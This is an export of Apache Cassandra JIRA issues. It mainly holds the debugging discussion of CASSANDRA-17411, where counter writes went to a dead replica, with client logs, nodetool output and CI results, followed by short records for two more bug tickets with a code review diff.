  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/cluster.py"", line 3522, in _reconnect_internal
    return self._try_connect(host)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/cluster.py"", line 3544, in _try_connect
    connection = self._cluster.connection_factory(host.endpoint, is_control_connection=True)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/cluster.py"", line 1620, in connection_factory
    return self.connection_class.factory(endpoint, self.connect_timeout, *args, **kwargs)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/connection.py"", line 831, in factory
    conn = cls(endpoint, *args, **kwargs)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/io/asyncorereactor.py"", line 344, in __init__
    self._connect_socket()
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/connection.py"", line 898, in _connect_socket
    raise socket.error(sockerr.errno, ""Tried connecting to %s. Last error: %s"" %
OSError: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-23 20:40:12,117 - target-dc1 - cassandra.connection - WARNING - Heartbeat failed for connection (139909241902704) to 127.0.0.1:9042
2022-03-23 20:40:12,117 - target-dc1 - cassandra.cluster - WARNING - Host 127.0.0.1:9042 has been marked down
2022-03-23 20:40:12,381 - target-dc3 - __main__ - INFO - Got 0/574 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:40:12,594 - target-dc2 - __main__ - INFO - Got 0/574 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-23 20:40:17,316 - target-dc1 - __main__ - INFO - Got 7/9 (77.777778) timeouts/total_rqs in the last 1 minute
2022-03-23 20:40:18,326 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 2.28 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-23 20:40:25,636 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 4.2 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-23 20:40:34,850 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 8.08 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-23 20:40:47,976 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 16.32 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
{noformat}

Which seems correct?;;;","29/Mar/22 14:13;pbalaguer;Hey [~brandon.williams], 

I am going to do a bit of an assumption with my comment, please correct me if I'm wrong.

If you kept the app running for a few more minutes you should have seen other ""got x/y ... timeouts/total_rqs"" where (x>0) entries, highlighting the client still sends requests to the DOWN node which didn't happen in c3. In c3 after in flight requests are concluded, no more traffic is sent to the DOWN node until it goes back UP

This behavior (sending queries to a DOWN node) is specially bad when counters are involved as those do not seem trigger speculative retries and always result in query timeouts for the client.
;;;","30/Mar/22 19:08;brandon.williams;Here it is with more time:

{noformat}
2022-03-30 18:57:07,763 - target-dc1 - cassandra.connection - WARNING - Heartbeat failed for connection (139719619682112) to 127.0.0.1:9042
2022-03-30 18:57:07,776 - target-dc3 - cassandra.connection - WARNING - Heartbeat failed for connection (139719619681680) to 127.0.0.1:9042
2022-03-30 18:57:07,980 - target-dc2 - __main__ - INFO - Got 0/579 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:57:08,094 - target-dc3 - __main__ - INFO - Got 0/579 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:57:12,768 - target-dc1 - cassandra.cluster - WARNING - [control connection] Error connecting to 127.0.0.1:9042:
Traceback (most recent call last):
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/cluster.py"", line 3522, in _reconnect_internal
    return self._try_connect(host)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/cluster.py"", line 3544, in _try_connect
    connection = self._cluster.connection_factory(host.endpoint, is_control_connection=True)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/cluster.py"", line 1620, in connection_factory
    return self.connection_class.factory(endpoint, self.connect_timeout, *args, **kwargs)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/connection.py"", line 831, in factory
    conn = cls(endpoint, *args, **kwargs)
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/io/asyncorereactor.py"", line 344, in __init__
    self._connect_socket()
  File ""/home/drift/cassandra-dtest/venv/src/cassandra-driver/cassandra/connection.py"", line 898, in _connect_socket
    raise socket.error(sockerr.errno, ""Tried connecting to %s. Last error: %s"" %
OSError: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:57:12,831 - target-dc1 - __main__ - INFO - Got 5/190 (2.631579) timeouts/total_rqs in the last 1 minute
2022-03-30 18:57:37,774 - target-dc1 - cassandra.connection - WARNING - Heartbeat failed for connection (139719602362976) to 127.0.0.1:9042
2022-03-30 18:57:37,775 - target-dc1 - cassandra.cluster - WARNING - Host 127.0.0.1:9042 has been marked down
2022-03-30 18:57:43,983 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 1.74 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:57:50,790 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 4.52 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:58:00,403 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 7.04 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:58:08,006 - target-dc2 - __main__ - INFO - Got 0/582 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:58:08,144 - target-dc3 - __main__ - INFO - Got 0/582 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:58:12,519 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 16.0 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:58:14,102 - target-dc1 - __main__ - INFO - Got 9/15 (60.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:58:33,550 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 33.28 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:59:08,102 - target-dc2 - __main__ - INFO - Got 0/584 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:59:08,221 - target-dc3 - __main__ - INFO - Got 0/584 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 18:59:11,914 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 55.04 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 18:59:16,479 - target-dc1 - __main__ - INFO - Got 12/23 (52.173913) timeouts/total_rqs in the last 1 minute
2022-03-30 19:00:08,126 - target-dc2 - __main__ - INFO - Got 0/586 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:00:08,246 - target-dc3 - __main__ - INFO - Got 0/586 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:00:12,003 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 125.44 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 19:00:18,924 - target-dc1 - __main__ - INFO - Got 12/24 (50.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:01:08,141 - target-dc2 - __main__ - INFO - Got 0/586 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:01:08,302 - target-dc3 - __main__ - INFO - Got 0/586 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:01:20,657 - target-dc1 - __main__ - INFO - Got 12/17 (70.588235) timeouts/total_rqs in the last 1 minute
2022-03-30 19:02:08,164 - target-dc2 - __main__ - INFO - Got 0/587 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:02:08,374 - target-dc3 - __main__ - INFO - Got 0/587 (0.000000) timeouts/total_rqs in the last 1 minute
2022-03-30 19:02:22,510 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 225.28 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-03-30 19:02:23,033 - target-dc1 - __main__ - INFO - Got 12/23 (52.173913) timeouts/total_rqs in the last 1 minute
{noformat}

node1 appears down to others:
{noformat}
Datacenter: dc1
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address    Load       Tokens  Owns (effective)  Host ID                               Rack
UN  127.0.0.2  91.08 KiB  1       100.0%            b79a56f9-74bb-488a-ae7a-def71b9d2e32  r1
DN  127.0.0.1  91.15 KiB  1       100.0%            f90307f3-fda3-47c9-9f78-e6f570a67790  r1

Datacenter: dc2
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address    Load       Tokens  Owns (effective)  Host ID                               Rack
UN  127.0.0.4  91.09 KiB  1       100.0%            d0b5d218-544f-4d06-802f-f526c8c7c106  r1
UN  127.0.0.3  91.09 KiB  1       100.0%            d8212283-807c-4ca2-a866-91320faaa9d2  r1

Datacenter: dc3
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address    Load       Tokens  Owns (effective)  Host ID                               Rack
UN  127.0.0.5  91.11 KiB  1       100.0%            82b6222b-79fc-42e6-b1d9-8a3710bb033b  r1
UN  127.0.0.6  91.09 KiB  1       100.0%            ca8c4b9b-d470-43f6-82cc-f6d910f282b3  r1
{noformat}

and everything appears down to node1:

{noformat}
Datacenter: dc1
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address    Load       Tokens  Owns (effective)  Host ID                               Rack
DN  127.0.0.2  91.08 KiB  1       100.0%            b79a56f9-74bb-488a-ae7a-def71b9d2e32  r1  
UN  127.0.0.1  91.15 KiB  1       100.0%            f90307f3-fda3-47c9-9f78-e6f570a67790  r1  

Datacenter: dc2
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address    Load       Tokens  Owns (effective)  Host ID                               Rack
DN  127.0.0.4  91.09 KiB  1       100.0%            d0b5d218-544f-4d06-802f-f526c8c7c106  r1  
DN  127.0.0.3  91.09 KiB  1       100.0%            d8212283-807c-4ca2-a866-91320faaa9d2  r1  

Datacenter: dc3
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address    Load       Tokens  Owns (effective)  Host ID                               Rack
DN  127.0.0.5  91.11 KiB  1       100.0%            82b6222b-79fc-42e6-b1d9-8a3710bb033b  r1  
DN  127.0.0.6  91.09 KiB  1       100.0%            ca8c4b9b-d470-43f6-82cc-f6d910f282b3  r1 
{noformat}

All behavior from the server side looks as expected, so I guess this is indeed a driver problem.
;;;","30/Mar/22 19:16;pbalaguer;Ah now I get where your brain was going towards, I thought you had problems reproducing the issue.

Fair enough, it is a bit ""odd"" the exact behavior happens in at least 2 different drivers (java & python) which is why I opened it here but anyway, I'll open tickets in their queues and reference this one for completeness if that seems ok to you.;;;","30/Mar/22 19:19;brandon.williams;Sure, I think that makes sense.  What I can confirm here is that the _coordinator_ isn't sending requests to the dead node, so there's nothing we can do on the server side for this behavior.;;;","27/May/22 22:43;absurdfarce;Hey [~brandon.williams] , I had to dig into this a bit for a related issue with the Python driver and I came up with some additional info which might be useful.  After looking into this it sure looks like this might be a server-side issue after all... but obviously I'll defer to you on that part. :)

 

Based on my testing I confirmed the following things about the LBPs in use by app.py when running against Cassandra 4.0.3:

 
 * When iptables is used to shut down access to one of the IP addresses the load balancing policy (LBP) in use by the client is notified that the node has gone down

 

 

 * As expected that LBP then removes the down node from it’s collection of “live” nodes for the given DC

 

 * The LBP no longer returns the down node when make_query_plan() is called

 

Great, but by itself that doesn't prove anything.  So I decided to take a look at the exceptions that were actually getting thrown in this case.  With the following change to app.py:

 

 
{code:java}
55c55,59
<         except (cassandra.OperationTimedOut, cassandra.WriteTimeout):
---
>         except cassandra.OperationTimedOut as exc:
>             LOG.info(exc)
>             timeout_counter += 1
>         except cassandra.WriteTimeout as exc:
>             LOG.info(exc) {code}
 

 

I see a sequence of two different error messages when I drop the iptables hammer.  The first is a set of ""Client request timeout"" messages (which is entirely expected since the LBP doesn't know about the down node yet) while the second looks to be a server-side issue:

 

 
{code:java}
2022-05-27 22:01:38,629 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042
2022-05-27 22:01:48,734 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042
2022-05-27 22:01:58,845 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042
2022-05-27 22:02:03,954 - target-dc1 - __main__ - INFO - Error from server: code=1100 [Coordinator node timed out waiting for replica nodes' responses] message=""Operation timed out - received only 0 responses."" info={'consistency': 'ONE', 'required_responses': 1, 'received_responses': 0, 'write_type': 'COUNTER'}
2022-05-27 22:02:14,172 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042
2022-05-27 22:02:22,545 - target-dc3 - __main__ - INFO - Got 0/579 (0.000000) timeouts/total_rqs in the last 1 minute
2022-05-27 22:02:22,548 - target-dc2 - __main__ - INFO - Got 0/579 (0.000000) timeouts/total_rqs in the last 1 minute
2022-05-27 22:02:24,275 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042
2022-05-27 22:02:24,376 - target-dc1 - __main__ - INFO - Got 6/66 (9.090909) timeouts/total_rqs in the last 1 minute
2022-05-27 22:02:34,387 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042
2022-05-27 22:02:44,695 - target-dc1 - __main__ - INFO - errors={'127.0.0.1:9042': 'Client request timeout. See Session.execute[_async](timeout)'}, last_host=127.0.0.1:9042 {code}
 

 

When the LBP gets notified of the down node things change; the ""Client request timeout"" disappears and all I see is the server-side issue:

 
{code:java}
2022-05-27 22:02:52,482 - target-dc1 - cassandra.cluster - WARNING - Host 127.0.0.1:9042 has been marked down                                                                     
2022-05-27 22:02:52,483 - target-dc1 - cassandra.policies - INFO - on_down for host 127.0.0.1:9042                                                                                
2022-05-27 22:02:52,485 - target-dc1 - cassandra.policies - INFO - Setting hosts for dc dc1 to (<Host: 127.0.0.2:9042 dc1>,)                                                      
2022-05-27 22:02:52,486 - target-dc1 - cassandra.policies - INFO - on_down for host 127.0.0.1:9042                                                                                
2022-05-27 22:02:52,488 - target-dc1 - cassandra.policies - INFO - on_down for host 127.0.0.1:9042                                                                                
2022-05-27 22:02:52,488 - target-dc1 - cassandra.policies - INFO - on_down for host 127.0.0.1:9042                                                                                
2022-05-27 22:02:57,507 - target-dc1 - cassandra.cluster - WARNING - [control connection] Error connecting to 127.0.0.1:9042:                                                     
Traceback (most recent call last):                                                                                                                                                
  File ""cassandra/cluster.py"", line 3522, in cassandra.cluster.ControlConnection._reconnect_internal                                                                              
  File ""cassandra/cluster.py"", line 3544, in cassandra.cluster.ControlConnection._try_connect                                                                                     
  File ""cassandra/cluster.py"", line 1620, in cassandra.cluster.Cluster.connection_factory                                              
  File ""cassandra/connection.py"", line 831, in cassandra.connection.Connection.factory                                                                                            
  File ""/home/automaton/les23/lib/python3.6/site-packages/cassandra/io/libevreactor.py"", line 267, in __init__
    self._connect_socket()                                                                                                                                                        
  File ""cassandra/connection.py"", line 898, in cassandra.connection.Connection._connect_socket                                         
OSError: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out
2022-05-27 22:02:57,609 - target-dc1 - __main__ - INFO - Error from server: code=1100 [Coordinator node timed out waiting for replica nodes' responses] message=""Operation timed out - received only 0 responses."" info={'consistency': 'ONE', 'required_responses': 1, 'received_responses': 0, 'write_type': 'COUNTER'}                                           
2022-05-27 22:02:58,615 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 2.22 seconds: [Errno None] Tried connecting to [('127.0.0.1', 9042)]. Last error: timed out                                                                                                                                  
2022-05-27 22:03:02,712 - target-dc1 - __main__ - INFO - Error from server: code=1100 [Coordinator node timed out waiting for replica nodes' responses] message=""Operation timed out - received only 0 responses."" info={'consistency': 'ONE', 'required_responses': 1, 'received_responses': 0, 'write_type': 'COUNTER'}                                           
2022-05-27 22:03:05,925 - target-dc1 - cassandra.pool - WARNING - Error attempting to reconnect to 127.0.0.1:9042, scheduling retry in 4.24 seconds: [Errno None] Tried connectin$
 to [('127.0.0.1', 9042)]. Last error: timed out
2022-05-27 22:03:07,917 - target-dc1 - __main__ - INFO - Error from server: code=1100 [Coordinator node timed out waiting for replica nodes' responses] message=""Operation timed out - received only 0 responses."" info={'consistency': 'ONE', 'required_responses': 1, 'received_responses': 0, 'write_type': 'COUNTER'}{code}
It appears that it's these server-side exceptions which are accounting for the non-zero error counts returned by the app.

 

If I can do anything to help repro or debug this further please let me know!

 

 ;;;","07/Jun/22 13:49;brandon.williams;I've simplified the reproduction in a dtest [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17411] and updated the fix versions accordingly while I continue to investigate.;;;","07/Jun/22 21:01;brandon.williams;I believe transient replication is what broke this [in this commit|https://github.com/apache/cassandra/commit/f7431b432875e334170ccdb19934d05545d2cebd] and never filtered out dead replicas when selecting one for counter writes.

||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17411-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/516/workflows/c19c3e37-5fd4-4057-8ed1-70a8594fe025], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/516/workflows/421da77e-42d7-4219-9f53-a1fae299a360]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17411-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/518/workflows/a1fe8fa9-5cdf-41c7-8f86-7088d5261a12], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/518/workflows/8f60ed4f-269d-4c36-9bf6-ec171408420e]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17411-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/517/workflows/51115c65-7f25-49f8-89e2-8fbb9cee5698], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/517/workflows/16011fa8-96e1-481d-9c02-d6c286c39d1f]|

[500 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/519/workflows/b509e5dd-ba9b-4aee-b2fa-74f1a6d4275e] on the new test against 4.1.;;;","16/Jun/22 13:38;adelapena;Looks good to me, +1. The new dtest reproduces the issue in the most clear way.

Maybe we can combine the new filter and the one right before into a single one to save us a copy of the collection of replicas:
{code:java}
replicas = replicas.filter(replica -> FailureDetector.instance.isAlive(replica.endpoint()) &&
                                      StorageService.instance.isRpcReady(replica.endpoint()));
{code}
However I doubt it would be worth the loss of readability.

The test failure of {{HostReplacementTest}} on 4.0 seems to be CASSANDRA-16953, and the failure of {{RepairErrorsTest}} on 4.1 looks like the same timeout on {{{}Cluster#close(){}}}. Both can be reproduced without the patch, so CI looks clean to me.;;;","16/Jun/22 14:07;brandon.williams;Committed as is for readability as suggested, thanks for the review!;;;","27/Jun/22 16:44;jmckenzie;Looks like a bit of infra pressure or flaky CI run; the ""1st failure"" tests below don't seem to have any rhyme or reason.

[CI Results]
Branch: 4.1, build number: 71
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/71/]
JIRA: CASSANDRA-17411
commit url: [https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=51ce71881c87df754969809b5f6b2a466abc1e35]
affected paths:
 * CHANGES.txt
 * src/java/org/apache/cassandra/service/StorageProxy.java

Build Result: UNSTABLE
Passing Tests: 47328
Failing Tests: 21
||Test|Failures|JIRA|
|dtest-offheap.repair_tests.repair_test.TestRepair.test_dc_repair|1 of 68|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestRepair*%22]|
|org.apache.cassandra.distributed.upgrade.CompactStoragePagingTest.testPagingWithCompactStorage|4 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionCollectionsTest.testFrozenWithNullValues[0: clusterMinVersion=3.0]-cdc|1 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testWriteOnlyIndex|5 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-novnode.bootstrap_test.TestBootstrap.test_simultaneous_bootstrap|1 of 68|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestBootstrap*%22]|
|org.apache.cassandra.cql3.validation.operations.SelectTest.testRangeQuery|4 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.drop_compact_storage_upgrade_test.TestDropCompactStorage.test_drop_compact_storage_mixed_cluster|8 of 68|CASSANDRA-17674?|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.tuplePartitionReadWrite|2 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|19 of 68|CASSANDRA-17651?|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|11 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_parallel_upgrade_with_internode_ssl|3 of 68|CASSANDRA-17610?|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|4 of 68|CASSANDRA-16677?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_RandomPartitioner_EndsAt_Trunk_HEAD.test_parallel_upgrade_with_internode_ssl|4 of 68|CASSANDRA-17296?|
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteBeforeRangeMovement|6 of 68|CASSANDRA-17461?|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnPartitionKeyInsertExpiringColumn|4 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexesOnNonStaticColumnsWhereSchemaIncludesStaticColumns|1 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.commitlog.GroupCommitLogTest.testOutOfOrderFlushRecoveryWithCompaction[3]-compression|1 of 68|CASSANDRA-17232?|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead|10 of 68|CASSANDRA-17461?|
|org.apache.cassandra.distributed.upgrade.MixedModeFrom3UnloggedBatchTest.testSimpleStrategy|4 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.testNestedTuple|9 of 68|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_indev_4_0_x_To_indev_4_1_x.test_bootstrap_multidc|3 of 68|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestUpgrade*%22]|;;;","28/Jun/22 10:33;adelapena;Yep, the failures that are seen for the first time in the run for this patch seem timeouts due to a bad CI run and, if I'm not missing anything, they don't fail in later runs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Return windows_timer_interval to Config ,CASSANDRA-17404,13430528,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,e.dimitrova,e.dimitrova,24/Feb/22 23:49,27/May/22 19:25,13/Jul/23 08:40,08/Mar/22 07:42,4.1,4.1-alpha1,,,,,Local/Config,,,,0,,"_windows_timer_interval_ was removed from Config in CASSANDRA-16956

Considering trunk is still considered to be released 4.1 and not 5, we need to deprecate this parameter with a note in NEWS.txt that it is just a placeholder, to prevent breaking upgrades.

When we bump to 5.0, we can revise this decision again.",,bereng,e.dimitrova,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16956,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 08 07:28:56 UTC 2022,,,,,,,All,,,,"0|z0zxc0:",9223372036854775807,,,,bereng,e.dimitrova,,,Normal,,NA,,https://github.com/apache/cassandra/commit/ae50cbd1ad2120bb070489e7b94d1f8ca393a4b9,,,,,,,,,ci run,,,,,"03/Mar/22 23:21;e.dimitrova;Ping [~stefan.miklosovic] ;;;","04/Mar/22 14:14;smiklosovic;https://github.com/apache/cassandra/pull/1484

 

https://app.circleci.com/pipelines/github/instaclustr/cassandra/785/workflows/bcea8059-5de6-4ee1-a2d5-7ed6e59d8e7c;;;","07/Mar/22 09:01;bereng;[~smiklosovic] would we want to run upgrade tests in that CI?;;;","07/Mar/22 15:16;e.dimitrova;CHANGES.txt also needs to be updated. ;;;","08/Mar/22 07:28;smiklosovic;[https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1477]

Updated CHANGES.txt, added message to NEWS.txt, run Jenkins build with upgrade tests passing.  Gonna ship this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unshared heap size excluding data calculation is broken,CASSANDRA-17402,13430395,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,jlewandowski,jlewandowski,24/Feb/22 09:57,27/May/22 19:24,13/Jul/23 08:40,07/Mar/22 16:36,4.0.4,4.1,4.1-alpha1,,,,Local/Memtable,,,,0,,"Unshared heap size excluding data calculation is broken. 

For example, it does not takes into consideration whether the buffers are on-heap or off-heap - empty offheap buffer is 64-bytes while empty heap buffer is 48-bytes. 

It matters especially when we have offheap buffers-based memtables. 
",,adelapena,blambov,e.dimitrova,jlewandowski,,,,,,,,,,,"blambov commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r814600780



##########
File path: src/java/org/apache/cassandra/utils/ObjectSizes.java
##########
@@ -96,58 +112,97 @@ private static long sizeOfArray(int length, long elementSize)
     }
 
     /**
-     * Memory a ByteBuffer array consumes.
+     * Amount of heap memory consumed by the array of byte buffers. It sums memory consumed by the array itself
+     * and for each included byte buffer using {@link #sizeOnHeapOf(ByteBuffer)}.
      */
     public static long sizeOnHeapOf(ByteBuffer[] array)
     {
-        long allElementsSize = 0;
-        for (int i = 0; i < array.length; i++)
-            if (array[i] != null)
-                allElementsSize += sizeOnHeapOf(array[i]);
+        if (array == null)
+            return 0;
 
-        return allElementsSize + sizeOfArray(array);
+        long sum = sizeOfArray(array);
+        for (ByteBuffer buffer : array)
+            sum += sizeOnHeapOf(buffer);
+
+        return sum;
     }
 
+    /**
